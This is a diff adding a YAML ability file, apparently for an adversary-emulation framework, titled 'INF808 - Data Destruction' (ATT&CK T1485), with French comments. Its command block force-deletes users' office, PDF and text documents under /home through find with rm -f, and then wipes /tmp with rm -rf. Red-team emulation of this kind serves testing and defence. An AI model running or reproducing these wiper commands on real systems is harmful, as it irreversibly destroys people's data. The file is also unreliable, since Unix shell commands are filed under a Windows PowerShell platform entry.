@@ -1,0 +1,20 @@
+- description: 'Delete or corrupt data on a compromised system to cause operational disruption.'
+  id: b519caebcd1a075d73fb656a47fc9179
+  name: INF808 - Data Destruction
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: |
+                  # Suppression des fichiers dans les répertoires de l'utilisateur
+                  echo "[*] Suppression des fichiers dans les répertoires utilisateur"
+                  find /home -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.pdf" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.txt" \) -exec rm -f {} \;
+
+                  # Suppression des fichiers critiques du système
+                  echo "[*] Suppression des fichiers de /tmp"
+                  rm -rf /tmp/*
+
+  tactic: impact
+  technique:
+    attack_id: T1485
+    name: Data Destruction
